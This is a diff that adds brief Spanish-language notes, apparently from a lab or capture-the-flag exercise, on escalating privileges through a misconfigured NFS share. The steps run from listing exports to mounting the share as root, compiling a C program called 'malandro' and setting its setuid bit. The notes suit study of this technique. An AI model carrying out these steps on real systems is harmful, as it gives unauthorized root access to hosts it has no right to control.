@@ -1,0 +1,21 @@
+checar los mount shares en una terminal y hacer el ssh en otra terminal
+
+showmount -e {{ip}}
+
+cat /etc/exports
+
+switch root para los shares
+
+cd /mnt y crear un folder michofolder
+
+mount -o rw {{ip}}:/home/ubuntu/sharefolder /mnt/michofolder
+
+crear un archivo en el shared folder en c
+
+ls -la /home/ubuntu/sharedfolder pa checar si tenemos acceso a escribir
+
+nano malandro.c
+gcc malandro.c -o malandro
+
+chmod +x malandro
+chmod +s malandro
